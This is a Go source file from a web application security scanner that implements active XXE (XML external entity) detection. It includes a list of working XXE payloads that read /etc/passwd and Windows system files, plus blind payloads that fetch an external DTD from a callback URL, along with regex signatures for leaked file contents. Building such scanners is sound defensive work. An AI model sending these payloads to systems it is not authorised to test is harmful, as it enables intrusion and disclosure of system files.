// Package scanner provides security scanning functionality for web applications.
package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/djannot/wast/pkg/auth"
	"github.com/djannot/wast/pkg/ratelimit"
	"go.opentelemetry.io/otel/trace"
)

// XXEScanner performs active XXE (XML External Entity) vulnerability detection.
type XXEScanner struct {
	BaseScanner
	callbackServer CallbackServer // For OOB detection
	safeMode       bool
}

// XXEScanResult represents the result of an XXE vulnerability scan.
type XXEScanResult struct {
	Target   string       `json:"target" yaml:"target"`
	Findings []XXEFinding `json:"findings" yaml:"findings"`
	Summary  XXESummary   `json:"summary" yaml:"summary"`
	Errors   []string     `json:"errors,omitempty" yaml:"errors,omitempty"`
}

// XXEFinding represents a single XXE vulnerability finding.
type XXEFinding struct {
	URL                  string `json:"url" yaml:"url"`
	Parameter            string `json:"parameter" yaml:"parameter"`
	Payload              string `json:"payload" yaml:"payload"`
	Evidence             string `json:"evidence,omitempty" yaml:"evidence,omitempty"`
	Severity             string `json:"severity" yaml:"severity"`
	Type                 string `json:"type" yaml:"type"` // "in-band", "blind", "error-based"
	Description          string `json:"description" yaml:"description"`
	Remediation          string `json:"remediation" yaml:"remediation"`
	Confidence           string `json:"confidence" yaml:"confidence"`
	Verified             bool   `json:"verified" yaml:"verified"`
	VerificationAttempts int    `json:"verification_attempts,omitempty" yaml:"verification_attempts,omitempty"`
}

// XXESummary provides an overview of the XXE scan results.
type XXESummary struct {
	TotalTests           int `json:"total_tests" yaml:"total_tests"`
	VulnerabilitiesFound int `json:"vulnerabilities_found" yaml:"vulnerabilities_found"`
	HighSeverityCount    int `json:"high_severity_count" yaml:"high_severity_count"`
	MediumSeverityCount  int `json:"medium_severity_count" yaml:"medium_severity_count"`
	LowSeverityCount     int `json:"low_severity_count" yaml:"low_severity_count"`
}

// xxePayload represents a test payload for XXE detection.
type xxePayload struct {
	Payload     string
	Type        string // "in-band", "blind", "error-based"
	Severity    string
	Description string
	Target      string // What the payload tries to access
}

// xxePayloads is the list of safe detection payloads to test for XXE.
var xxePayloads = []xxePayload{
	// Basic entity injection - /etc/passwd (Linux)
	{
		Payload:     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		Type:        "in-band",
		Severity:    SeverityHigh,
		Description: "XXE vulnerability detected - application allows local file inclusion via XML external entities",
		Target:      "file:///etc/passwd",
	},
	// Alternative syntax with ELEMENT
	{
		Payload:     `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`,
		Type:        "in-band",
		Severity:    SeverityHigh,
		Description: "XXE vulnerability detected - local file disclosure through XML external entity",
		Target:      "file:///etc/passwd",
	},
	// Windows file - boot.ini
	{
		Payload:     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><root>&xxe;</root>`,
		Type:        "in-band",
		Severity:    SeverityHigh,
		Description: "XXE vulnerability detected - Windows file disclosure via XML external entity",
		Target:      "file:///c:/boot.ini",
	},
	// Windows alternative - win.ini
	{
		Payload:     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
		Type:        "in-band",
		Severity:    SeverityHigh,
		Description: "XXE vulnerability detected - Windows system file access through XXE",
		Target:      "file:///c:/windows/win.ini",
	},
	// Error-based XXE - non-existent file
	{
		Payload:     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_xxe_test_file_12345">]><root>&xxe;</root>`,
		Type:        "error-based",
		Severity:    SeverityMedium,
		Description: "XXE vulnerability detected - XML parsing errors reveal file system access attempts",
		Target:      "file:///nonexistent_xxe_test_file_12345",
	},
	// Parameter entity (blind XXE) - will be templated with callback URL
	{
		Payload:     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{CALLBACK_URL}}"> %xxe;]><root>test</root>`,
		Type:        "blind",
		Severity:    SeverityHigh,
		Description: "Blind XXE vulnerability detected - application processes external DTD references",
		Target:      "callback",
	},
	// External DTD reference (blind XXE)
	{
		Payload:     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "{{CALLBACK_URL}}/evil.dtd"><root>test</root>`,
		Type:        "blind",
		Severity:    SeverityHigh,
		Description: "Blind XXE vulnerability detected - external DTD processing enabled",
		Target:      "callback",
	},
	// SOAP envelope with XXE
	{
		Payload:     `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>`,
		Type:        "in-band",
		Severity:    SeverityHigh,
		Description: "XXE vulnerability in SOAP endpoint - local file disclosure possible",
		Target:      "file:///etc/passwd",
	},
}

// Detection signatures for XXE in responses
var xxeSignatures = []struct {
	pattern     *regexp.Regexp
	fileType    string
	description string
}{
	{
		pattern:     regexp.MustCompile(`root:x:\d+:\d+:`),
		fileType:    "/etc/passwd",
		description: "/etc/passwd file content detected in response",
	},
	{
		pattern:     regexp.MustCompile(`/bin/(bash|sh|zsh|dash)`),
		fileType:    "/etc/passwd",
		description: "Unix shell paths from /etc/passwd detected",
	},
	{
		pattern:     regexp.MustCompile(`\[boot loader\]`),
		fileType:    "boot.ini",
		description: "Windows boot.ini content detected in response",
	},
	{
		pattern:     regexp.MustCompile(`\[fonts\]|\[extensions\]`),
		fileType:    "win.ini",
		description: "Windows win.ini content detected in response",
	},
	{
		pattern:     regexp.MustCompile(`(?i)(No such file|cannot open|file not found|does not exist).*xxe_test_file`),
		fileType:    "error",
		description: "XML parsing error revealing file system access",
	},
	{
		pattern:     regexp.MustCompile(`(?i)(failed to load external entity|error on line|ParseError|SAXException)`),
		fileType:    "error",
		description: "XML parser error message revealing XXE processing",
	},
}

// XXEOption is a functional option for configuring XXEScanner.
type XXEOption func(*XXEScanner)

// WithXXEHTTPClient sets a custom HTTP client for the XXE scanner.
func WithXXEHTTPClient(c HTTPClient) XXEOption {
	return func(s *XXEScanner) { s.client = c }
}

// WithXXEUserAgent sets a custom user agent for the XXE scanner.
func WithXXEUserAgent(ua string) XXEOption {
	return func(s *XXEScanner) { s.userAgent = ua }
}

// WithXXETimeout sets the timeout for XXE scanner requests.
func WithXXETimeout(d time.Duration) XXEOption {
	return func(s *XXEScanner) { s.timeout = d }
}

// WithXXEAuth sets authentication configuration for the XXE scanner.
func WithXXEAuth(config *auth.AuthConfig) XXEOption {
	return func(s *XXEScanner) { s.authConfig = config }
}

// WithXXERateLimiter sets a rate limiter for the XXE scanner.
func WithXXERateLimiter(limiter ratelimit.Limiter) XXEOption {
	return func(s *XXEScanner) { s.rateLimiter = limiter }
}

// WithXXERateLimitConfig sets a rate limiter from config for the XXE scanner.
func WithXXERateLimitConfig(cfg ratelimit.Config) XXEOption {
	return func(s *XXEScanner) { s.rateLimiter = ratelimit.NewLimiterFromConfig(cfg) }
}

// WithXXETracer sets an OpenTelemetry tracer for the XXE scanner.
func WithXXETracer(tracer trace.Tracer) XXEOption {
	return func(s *XXEScanner) { s.tracer = tracer }
}

// WithXXECallbackServer sets the callback server for out-of-band XXE detection.
func WithXXECallbackServer(server CallbackServer) XXEOption {
	return func(s *XXEScanner) { s.callbackServer = server }
}

// WithXXESafeMode sets safe mode for the XXE scanner.
func WithXXESafeMode(safe bool) XXEOption {
	return func(s *XXEScanner) { s.safeMode = safe }
}

// NewXXEScanner creates a new XXEScanner with the given options.
func NewXXEScanner(opts ...XXEOption) *XXEScanner {
	base := DefaultBaseScanner()
	base.timeout = 10 * time.Second // XXE uses shorter default timeout
	s := &XXEScanner{BaseScanner: base}
	for _, opt := range opts {
		opt(s)
	}
	// Create default HTTP client if none provided
	if s.client == nil {
		s.client = &http.Client{
			Timeout: s.timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return http.ErrUseLastResponse
				}
				return nil
			},
		}
	}
	return s
}

// NewXXEScannerFromBase creates a new XXEScanner from pre-built BaseOptions
// plus any scanner-specific options.
func NewXXEScannerFromBase(baseOpts []BaseOption, extraOpts ...XXEOption) *XXEScanner {
	base := DefaultBaseScanner()
	base.timeout = 10 * time.Second
	s := &XXEScanner{BaseScanner: base}
	ApplyBaseOptions(&s.BaseScanner, baseOpts)
	for _, opt := range extraOpts {
		opt(s)
	}
	if s.client == nil {
		s.client = &http.Client{
			Timeout: s.timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return http.ErrUseLastResponse
				}
				return nil
			},
		}
	}
	return s
}

// Scan performs the XXE vulnerability scan on the target URL.
func (s *XXEScanner) Scan(ctx context.Context, targetURL string) *XXEScanResult {
	if s.tracer != nil {
		var span trace.Span
		ctx, span = s.tracer.Start(ctx, "xxe.Scan")
		defer span.End()
	}

	result := &XXEScanResult{
		Target:   targetURL,
		Findings: make([]XXEFinding, 0),
		Summary: XXESummary{
			TotalTests: 0,
		},
		Errors: make([]string, 0),
	}

	// Skip active scans in safe mode
	if s.safeMode {
		result.Errors = append(result.Errors, "XXE scanning skipped in safe mode")
		return result
	}

	// Parse the target URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("invalid target URL: %v", err))
		return result
	}

	// Discover endpoints that might accept XML
	endpoints := s.discoverXMLEndpoints(ctx, parsedURL)

	// Test each endpoint with XXE payloads
	for _, endpoint := range endpoints {
		findings := s.testEndpointForXXE(ctx, endpoint)
		result.Findings = append(result.Findings, findings...)
		result.Summary.TotalTests += len(xxePayloads)
	}

	// Update summary
	result.Summary.VulnerabilitiesFound = len(result.Findings)
	for _, finding := range result.Findings {
		switch finding.Severity {
		case SeverityHigh:
			result.Summary.HighSeverityCount++
		case SeverityMedium:
			result.Summary.MediumSeverityCount++
		case SeverityLow:
			result.Summary.LowSeverityCount++
		}
	}

	return result
}

// discoverXMLEndpoints identifies endpoints that might accept XML input.
func (s *XXEScanner) discoverXMLEndpoints(ctx context.Context, parsedURL *url.URL) []string {
	endpoints := make([]string, 0)

	// Test the base URL
	baseURL := parsedURL.String()
	endpoints = append(endpoints, baseURL)

	// Common XML/SOAP endpoints
	xmlPaths := []string{
		"/api/xml",
		"/soap",
		"/ws",
		"/xmlrpc",
		"/api/v1/xml",
		"/services",
	}

	for _, path := range xmlPaths {
		testURL := parsedURL.Scheme + "://" + parsedURL.Host + path
		endpoints = append(endpoints, testURL)
	}

	return endpoints
}

// testEndpointForXXE tests a specific endpoint for XXE vulnerabilities.
func (s *XXEScanner) testEndpointForXXE(ctx context.Context, endpointURL string) []XXEFinding {
	findings := make([]XXEFinding, 0)

	// Test with each XXE payload
	for _, payload := range xxePayloads {
		// Apply rate limiting
		if s.rateLimiter != nil {
			if err := s.rateLimiter.Wait(ctx); err != nil {
				continue
			}
		}

		// Prepare the payload
		finalPayload := payload.Payload

		// For blind XXE payloads, inject callback URL
		if payload.Type == "blind" && s.callbackServer != nil {
			callbackID := s.callbackServer.GenerateCallbackID()
			callbackURL := s.callbackServer.GetHTTPCallbackURL(callbackID)
			finalPayload = strings.ReplaceAll(finalPayload, "{{CALLBACK_URL}}", callbackURL)

			// Send the request with the payload
			finding := s.sendXXERequest(ctx, endpointURL, finalPayload, payload)
			if finding != nil {
				// Wait for callback
				event, received := s.callbackServer.WaitForCallback(ctx, callbackID, 5*time.Second)
				if received {
					finding.Verified = true
					finding.Evidence = fmt.Sprintf("Out-of-band callback received from %s at %s", event.SourceIP, event.Timestamp.Format(time.RFC3339))
					findings = append(findings, *finding)
				}
			}
		} else if payload.Type != "blind" {
			// For in-band and error-based XXE
			finding := s.sendXXERequest(ctx, endpointURL, finalPayload, payload)
			if finding != nil {
				findings = append(findings, *finding)
			}
		}
	}

	return findings
}

// sendXXERequest sends an HTTP request with an XXE payload and checks for vulnerability.
func (s *XXEScanner) sendXXERequest(ctx context.Context, targetURL, payload string, payloadInfo xxePayload) *XXEFinding {
	// Try both POST and GET methods
	methods := []string{"POST", "GET"}
	contentTypes := []string{
		"application/xml",
		"text/xml",
		"application/soap+xml",
	}

	for _, method := range methods {
		for _, contentType := range contentTypes {
			var req *http.Request
			var err error

			if method == "POST" {
				req, err = http.NewRequestWithContext(ctx, method, targetURL, strings.NewReader(payload))
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", contentType)
			} else {
				// For GET, try passing XML as a parameter
				parsedURL, parseErr := url.Parse(targetURL)
				if parseErr != nil {
					continue
				}
				q := parsedURL.Query()
				q.Set("xml", payload)
				q.Set("data", payload)
				parsedURL.RawQuery = q.Encode()

				req, err = http.NewRequestWithContext(ctx, method, parsedURL.String(), nil)
				if err != nil {
					continue
				}
			}

			req.Header.Set("User-Agent", s.userAgent)

			// Apply authentication
			if s.authConfig != nil {
				s.authConfig.ApplyToRequest(req)
			}

			// Send the request
			resp, err := s.client.Do(req)
			if err != nil {
				continue
			}

			// Read response body
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}

			bodyStr := string(body)

			// Check for XXE signatures in the response
			for _, sig := range xxeSignatures {
				if sig.pattern.MatchString(bodyStr) {
					evidence := s.extractEvidence(bodyStr, sig.pattern)
					return &XXEFinding{
						URL:         targetURL,
						Parameter:   method + " " + contentType,
						Payload:     payload,
						Evidence:    evidence,
						Severity:    payloadInfo.Severity,
						Type:        payloadInfo.Type,
						Description: payloadInfo.Description,
						Remediation: "Disable XML external entity processing in your XML parser. Configure the parser to disallow DOCTYPE declarations and external entity references. Use XML parsers with secure defaults.",
						Confidence:  "high",
						Verified:    true,
					}
				}
			}
		}
	}

	return nil
}

// extractEvidence extracts relevant evidence from the response body.
func (s *XXEScanner) extractEvidence(body string, pattern *regexp.Regexp) string {
	matches := pattern.FindStringSubmatch(body)
	if len(matches) > 0 {
		// Return the first match, truncated if too long
		evidence := matches[0]
		if len(evidence) > 200 {
			evidence = evidence[:200] + "..."
		}
		return evidence
	}

	// If no submatch, return a snippet of the body around the match
	loc := pattern.FindStringIndex(body)
	if loc != nil {
		start := loc[0]
		end := loc[1]
		if start > 50 {
			start -= 50
		} else {
			start = 0
		}
		if end+50 < len(body) {
			end += 50
		} else {
			end = len(body)
		}
		evidence := body[start:end]
		if len(evidence) > 200 {
			evidence = evidence[:200] + "..."
		}
		return evidence
	}

	return ""
}

// VerifyFinding verifies an XXE finding by retesting it.
func (s *XXEScanner) VerifyFinding(ctx context.Context, finding *XXEFinding, config VerificationConfig) (*VerificationResult, error) {
	if s.tracer != nil {
		var span trace.Span
		ctx, span = s.tracer.Start(ctx, "xxe.VerifyFinding")
		defer span.End()
	}

	result := &VerificationResult{
		Verified:   false,
		Confidence: 0.0,
		Attempts:   0,
	}

	if !config.Enabled {
		return result, nil
	}

	maxRetries := config.MaxRetries
	if maxRetries == 0 {
		maxRetries = 3
	}

	delay := config.Delay
	if delay == 0 {
		delay = 500 * time.Millisecond
	}

	for attempt := 0; attempt < maxRetries; attempt++ {
		result.Attempts++

		// Wait before retry (except first attempt)
		if attempt > 0 {
			time.Sleep(delay)
		}

		// Resend the request
		var req *http.Request
		var err error

		// Parse the parameter to determine method and content type
		parts := strings.Split(finding.Parameter, " ")
		method := "POST"
		contentType := "application/xml"
		if len(parts) > 0 {
			method = parts[0]
		}
		if len(parts) > 1 {
			contentType = parts[1]
		}

		if method == "POST" {
			req, err = http.NewRequestWithContext(ctx, method, finding.URL, strings.NewReader(finding.Payload))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", contentType)
		} else {
			parsedURL, parseErr := url.Parse(finding.URL)
			if parseErr != nil {
				continue
			}
			q := parsedURL.Query()
			q.Set("xml", finding.Payload)
			q.Set("data", finding.Payload)
			parsedURL.RawQuery = q.Encode()

			req, err = http.NewRequestWithContext(ctx, method, parsedURL.String(), nil)
			if err != nil {
				continue
			}
		}

		req.Header.Set("User-Agent", s.userAgent)

		// Apply authentication
		if s.authConfig != nil {
			s.authConfig.ApplyToRequest(req)
		}

		// Send the request
		resp, err := s.client.Do(req)
		if err != nil {
			continue
		}

		// Read response body
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		bodyStr := string(body)

		// Check for XXE signatures in the response
		matched := false
		for _, sig := range xxeSignatures {
			if sig.pattern.MatchString(bodyStr) {
				matched = true
				break
			}
		}

		if matched {
			result.Verified = true
			result.Confidence = 0.9 // High confidence for verified XXE
			return result, nil
		}
	}

	// If verification failed after all retries
	result.Confidence = 0.3
	return result, nil
}
